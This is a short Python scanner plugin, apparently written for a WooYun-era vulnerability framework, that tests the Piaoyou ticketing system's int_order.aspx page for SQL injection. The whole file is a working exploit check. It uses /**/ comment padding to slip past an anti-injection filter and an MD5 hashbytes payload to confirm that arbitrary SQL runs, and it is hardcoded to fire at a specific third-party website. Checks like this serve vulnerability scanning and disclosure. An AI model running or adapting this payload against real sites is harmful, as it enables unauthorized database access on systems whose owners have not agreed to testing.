#!/usr/bin/evn python 
#--coding:utf-8--*--
#Name:票友票务系统通用sql注入#1（简单绕防注入）
#Refer:http://www.wooyun.org/bugs/wooyun-2010-0128323
#Author:xq17

def assign(service, arg):
    if service == "piaoyou":
        return True, arg
                
def audit(arg): 
        url = arg + 'tickets/int_order.aspx?id=1/**/and+1=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--'
        code, head, res, errcode, _ = curl.curl2(url)
        if code!=0 and '81dc9bdb52d04dc20036dbd8313ed055' in res :
            security_hole(url + '  :found sql Injection')

if __name__ == '__main__':
    from dummy import *
    audit(assign('piaoyou','http://www.iyoungsh.com/')[1])